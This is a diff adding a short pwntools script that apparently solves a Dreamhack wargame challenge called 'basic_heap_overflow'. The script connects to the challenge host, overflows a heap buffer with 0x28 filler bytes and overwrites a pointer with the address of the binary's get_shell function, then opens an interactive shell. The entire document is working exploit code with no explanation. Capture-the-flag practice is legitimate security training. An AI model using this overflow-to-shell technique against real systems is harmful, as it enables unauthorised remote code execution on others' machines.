@@ -1,0 +1,12 @@
+from pwn import *
+
+p = remote("host8.dreamhack.games", 8576)
+e = ELF("/mnt/c/Users/storm/downloads/8fbb2673-bdb3-45a6-9231-3eb9bc109f81/basic_heap_overflow")
+
+get_shell = e.symbols['get_shell']
+
+payload = b'A' * 0x28
+payload += p32(get_shell)
+
+p.send(payload)
+p.interactive()
